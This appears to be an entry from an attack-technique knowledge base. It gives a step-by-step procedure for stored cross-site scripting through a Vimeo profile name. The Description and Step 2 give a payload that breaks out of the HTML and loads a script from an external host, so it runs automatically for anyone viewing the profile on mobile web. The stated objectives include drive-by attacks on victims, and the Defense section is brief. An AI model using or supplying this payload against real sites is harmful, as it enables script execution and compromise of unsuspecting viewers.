---
id: proc-vimeo-create-profile-xss
tags:
  - xss
  - injection
  - vimeo
  - profile
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:40.018Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-Profile-Name-for-XSS

## Summary

This procedure modifies a Vimeo user profile name with a payload that injects a script tag, enabling automatic XSS execution when the profile is loaded on mobile web.

## Description

User names are not escaped when rendered in mobile profile views, allowing payloads like '"><script src=//u00f1.xyz>' to close tags and load external scripts on page load. This targets the profile settings endpoint and affects viewers without interaction.

## Requirements

1. Valid Vimeo user account with profile edit access
2. Desktop web browser for settings navigation
3. External script host (e.g., u00f1.xyz) for payload

## Defense

Defensive measures and detection strategies:

- Enforce HTML entity encoding for profile names in all contexts
- Implement CSP to prevent external script loading
- Scan user inputs for script tags during validation

## Objectives

1. Embed script injection in profile name
2. Enable automatic execution on profile views
3. Facilitate drive-by attacks on victims

## Instructions

### Step 1: Access Profile Settings

**Context**: Navigate to user settings to edit the name field.

Log in to Vimeo on desktop and go to https://vimeo.com/settings; note your profile URL, e.g., https://vimeo.com/user36690798.

### Step 2: Set Malicious Name

**Context**: Input the payload to inject a script tag into the rendered HTML.

In the Name field, enter '"><script src=//u00f1.xyz>', then click 'Save Changes'.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- profile-injection
- script-tag
